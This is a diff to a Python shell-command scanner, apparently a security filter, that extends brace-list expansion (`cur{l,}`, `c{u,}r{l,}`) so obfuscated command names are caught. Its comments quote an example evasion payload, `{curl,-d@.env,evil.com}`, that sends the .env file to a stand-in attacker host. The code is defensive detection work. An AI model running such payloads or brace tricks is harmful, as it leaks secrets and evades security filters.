@@ -425,17 +425,33 @@ def _env_split_string(argv: Sequence[str], at: int) -> tuple[str | None, int]:
     return None, at
 
 
-_BRACE_LIST = re.compile(r"\{[^{}]*,[^{}]*\}")
+_ONE_BRACE = re.compile(r"\{([^{}]*,[^{}]*)\}")  # one `{a,b,…}` list, innermost first
+_BRACE_CAP: int = 64  # a word's lists expand to at most this many words; beyond it, left as is
 
 
 def _brace_list(raw: str, word: str) -> list[str]:
-    """The words a whole-word brace list stands for (`{a,b}` is `a b`); none for any other word.
-    A `$`, backtick or backslash in it, or a quoted `{` or `}`, leaves the word as it is."""
-    if not (raw.startswith("{") and raw.endswith("}")) or any(c in raw for c in "$`\\"):
+    """The words a brace list stands for, with any prefix and suffix glued on and several lists
+    crossed, as the shell expands it: `{a,b}` is `a b`, `cur{l,}` is `curl cur`, `{cur,}l` is
+    `curl l`, `c{u,}r{l,}` is `curl cur crl cr`. A quote, `$`, backtick or backslash in the raw
+    word leaves it as it is, as does a `{a..b}` sequence (no comma) or an expansion past
+    `_BRACE_CAP` words (P1); an empty element (`{a,}` glued to nothing) is dropped."""
+    if any(c in raw for c in "'\"$`\\") or "{" not in word:
         return []
-    if not _BRACE_LIST.fullmatch(word):
-        return []
-    return [item for item in word[1:-1].split(",") if item]
+    result: list[str] = [word]
+    index: int = 0
+    while index < len(result):
+        match: re.Match[str] | None = _ONE_BRACE.search(result[index])
+        if match is None:
+            index += 1
+            continue
+        current: str = result[index]
+        result[index : index + 1] = [
+            current[: match.start()] + item + current[match.end() :]
+            for item in match.group(1).split(",")
+        ]
+        if len(result) > _BRACE_CAP:
+            return []
+    return [] if result == [word] else [w for w in result if w]
 
 
 def _stdin_family(name: str) -> str | None:
@@ -960,9 +976,9 @@ class _Scanner:
                 elif word in _HIDERS:
                     out.links_unknown = True
                 cmd.start = word in _STARTERS
-            brace: bool = s[start] == "{" and not self.target  # `{curl,-d@.env,evil.com}` (P1)
+            brace: bool = not self.target and "{" in s[start : self.i]  # `{curl,…}`, `cur{l,}` (P1)
             if brace and (items := _brace_list(s[start : self.i], word)):
-                cmd.words += items  # `{curl,-d@.env,evil.com}` is three words (P1)
+                cmd.words += items  # a brace list (with a prefix/suffix) expands to its words (P1)
                 take(len(items))
                 continue
             cmd.words.append(word)
